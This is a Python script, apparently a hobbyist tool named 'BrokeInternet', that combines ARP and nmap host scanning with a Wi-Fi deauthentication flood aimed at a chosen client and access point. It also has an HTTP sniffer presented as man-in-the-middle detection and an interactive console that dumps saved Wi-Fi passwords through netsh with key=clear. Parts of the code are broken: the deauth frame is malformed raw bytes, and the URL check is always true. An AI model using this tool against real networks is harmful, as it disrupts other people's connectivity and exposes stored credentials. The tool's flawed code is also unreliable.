#!/usr/bin/python3

from scapy.all import *
from colorama import Fore,Back,Style
from scapy.layers import http
import scapy.all as scapy
import time
import argparse
import nmap
import subprocess
import struct
import binascii
import socket
import shlex
import pprint


def get_help_documentation():

    print("""
    =============================================================================
     ______   _______  _______  _        _______ _________ _       _________    7
    (  ___ \ (  ____ )(  ___  )| \    /\(  ____ \/__   __/( (    /|\__   __/    7
    | (   ) )| (    )|| (   ) ||  \  / /| (    \/   ) (   |  \  ( |   ) (       7
    | (__/ / | (____)|| |   | ||  (_/ / | (__       | |   |   \ | |   | |       7
    |  __ (  |     __)| |   | ||   _ (  |  __)      | |   | (\ \) |   | |       7
    | (  \ \ | (\ (   | |   | ||  ( \ \ | (         | |   | | \   |   | |       7
    | )___) )| ) \ \__| (___) ||  /  \ \| (____/\___) (___| )  \  |   | |       7
    |/ \___/ |/   \__/(_______)|_/    \/(_______/\_______/|/    )_)   )_(       7
    >									                                        
    >                                                                           7
    >                   Author : HunkarAcar				                        
    >	            Program : Deauth Attack And Network Reconnaissance          7
    >									                                        	
    =============================================================================  
    """)
    time.sleep(2)


    parser = argparse.ArgumentParser(
        prog='BrokeInternet',
        description="network denial of service attack"
    )

    parser.add_argument('-ip','--ipaddress',type=str,
                        help='It will scan ip addresses with cidr display')

    parser.add_argument('-nmap','--nmap', action="store_true",
                        help='It aims to learn mac address of devices using nmap')

    parser.add_argument('-deauth', '--deauth',type=int,
                        help='we need to specify how many packages we will send')

    parser.add_argument('-a','--accesspoint',type=str,
                        help='modem Mac address required')

    parser.add_argument('-c','--client',type=str,
                        help='Target client Mac address required')

    parser.add_argument('-iface','--iface',type=str,
                        help='network interface must be specified')

    parser.add_argument('-M','--mitm',required=False,action='store_true',
                        help='detects a man-in-the-middle attack at a basic level')

    parser.add_argument('-network','--network',action='store_true',
                        help='Shows the networks around in detail')

    parser.add_argument('-netPas','--networkPassword',action='store_true',
                        help="shows the wifi passwords you are using")


    args = parser.parse_args()

    return args



import scapy.all as scapy

def get_scanARP_network(ip_range):

    #Detect devices on network using arp request
    arp_request = scapy.ARP(pdst=ip_range)
    arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    #Combines packages
    arp_request_broadcast = arp_broadcast/arp_request

    #print(ip + "...")
    answered_list = scapy.srp(arp_request_broadcast,timeout=37,verbose=True)[0]

    #processing responses
    devices = []

    for response in answered_list:
        device = {
            "IP": response[1].psrc,
            "MAC": response[1].hwsrc
        }
        devices.append(device)

    return devices

    get_scanARP_network = get_scanARP_network(ip_range)

    #print result

    if get_scanARP_network:
        print(Fore.GREEN + "Discovered Devices:" + Fore.RESET)
        for device in get_scanARP_network:
            pprint.pprint(f"IP:{device['IP']}\nMAC: {device['MAC']}")
            #print(f"IP:{device['IP']}\nMAC: {device['MAC']}")

    else:
        print(Fore.RED + "No devices found on the network" + Fore.RESET )



def get_scan_with_nmap(ip_range):

    #Detect devices on network using nmap
    scanner = nmap.PortScanner()
    host = ip_range
    #Detects devices and mac addresses on the network with a powerful nmap scanning scripting
    argument = " -v -sn -PR -PR --host-timeout 2000ms --max-retries 2 -n -sP "

    scan_result = scanner.scan(hosts=host,arguments=argument)

    #print(type(scan_result)) => dict type

    #logic process

    print("Scanning Devices...")
    print("-----------------------------")
    time.sleep(4)

    if 'scan' in scan_result:

        for ip, result in scan_result['scan'].items():
            mac_address = result['addresses'].get('mac', 'Not Found')
            status = result['status']['state']
            print(f"IP: {ip}\nMAC: {mac_address}\nState: {status}")

    else:
        print(Fore.RED + "No Devices found on the network" + Fore.RESET)




def attack_deauth(deauth_packet, accesspoint, client, iface):

    access_mac = accesspoint.replace(':', '')
    target_mac = client.replace(':', '')

    def create_deauth_packet(target_mac, access_mac):
        target_mac = binascii.unhexlify(target_mac)
        access_mac = binascii.unhexlify(access_mac)
        packet = b"\xC0\x00\x00\x00" + access_mac + target_mac + b"\x00\x00"
        return packet

    def send_deauth_packets(deauth_packet, access_mac, target_mac, iface):
        deauth_packets = create_deauth_packet(target_mac, access_mac)

        try:

            print(Fore.GREEN + "DEAUTH ATTACK BEGINS..." + Fore.RESET)
            time.sleep(1)

            for i in range(deauth_packet):
                sendp(deauth_packets, iface=iface, count=1, inter=0.1, verbose=False)
                print(f"Deauth {deauth_packet} packet sent.")
                time.sleep(0.1)


        except KeyboardInterrupt:
            print(Fore.RED + "\nDEAUTH ATTACK STOPPED!!" + Fore.RESET)

    send_deauth_packets(deauth_packet, access_mac, target_mac, iface)



def mitm_attack_detect(interface):

    try:
        def process_packet(packet):
            if packet.haslayer(http.HTTPRequest):
                url = get_url(packet)

                if "login" or "my-account" or "sign in" or "account" or "giriş" or "üye ol" or "kaydol" or "Register" in url:
                    print(Fore.RED + "Possible MITM Attack Detected: Dangerous URL - " + url + Fore.RESET)

                else:
                    print(Fore.YELLOW + "HTTP Request: " + url + Fore.RESET)

        def get_url(packet):

            return packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()

        scapy.sniff(iface=interface, store=False, prn=process_packet)


    except KeyboardInterrupt:
        print(Fore.BLUE + "MITM attack detection stopped" + Fore.RESET)

    except Exception as e:
        print("ERROR occured:", str(e))
        return False


def get_detailed_network():

    command = "netsh wlan show network mode=bssid"

    try:

        command_execute = subprocess.call(shlex.split(command))
        return command_execute

    except Exception as error:

        print(Fore.RED + f"The command only works on windows operating system!!!!\n{error}" + Fore.RESET)
        return None


def get_Detalied_Network_Password():

    print("passconsole => You can switch to interactive shell by typing passconsole")
    get_console = input(">")

    if get_console == "passconsole":

        print("---------------------------------")
        print("""
        help > networkShow => Shows the wifi you have used
        help > networkPassword => Shows the passwords of the wifi you use
        help > help => Get help Documentation
        help > exit => Exit the program
        """)
        print("---------------------------------")

        while 1==1:

            try:

                get_command = input("passconsole>")

                if get_command == "networkShow":

                    command_e = "netsh wlan show profile"
                    command_exe = subprocess.call(shlex.split(command_e))
                    print(command_exe)

                elif get_command == "networkPassword":

                    get_SSID = input("Enter the name of the SSID whose password you want to see> ")
                    command_e = f"netsh wlan show profile '{get_SSID}' key=clear"

                    command_exe = subprocess.call(shlex.split(command_e))
                    print(command_exe)

                elif get_command == "help":
                    print("---------------------------------")
                    print("""
                       help > networkShow => Shows the wifi you have used
                       help > networkPassword => Shows the passwords of the wifi you use
                       help > help => Get help Documentation
                       help > exit => Exit the program
                       """)
                    print("---------------------------------")


                elif get_command == "exit":
                    break

                else:
                    print("Wrong Choice!!")

            except KeyboardInterrupt:
                print(Fore.RED + """
                BYE !!
                """ + Fore.RESET)
                break

    else:
        print("You must write > passconsole ")




    """
    command_e = "netsh wlan show profile"

    command_exe = subprocess.call(shlex.split(command_e))
    return command_exe 
    """


"""
Deauth Attack using Python 
GUI design for this code with PYTQ5
Network Scan and detect device 

"""


def main():
    args = get_help_documentation()

    ipaddress = args.ipaddress
    i_face = args.iface
    deauth = args.deauth
    access_point = args.accesspoint
    client_mac = args.client

    if args.mitm:
        print(mitm_attack_detect(i_face))


    elif args.deauth and args.accesspoint and args.client and args.iface:
        attack_deauth(deauth, access_point, client_mac, i_face)


    elif args.nmap:
        print(get_scan_with_nmap(ipaddress))


    elif args.network:
        print(get_detailed_network())


    elif args.networkPassword:
        get_Detalied_Network_Password()


    elif args.ipaddress:
        print(get_scanARP_network(ipaddress))



if __name__ == "__main__":
    main()
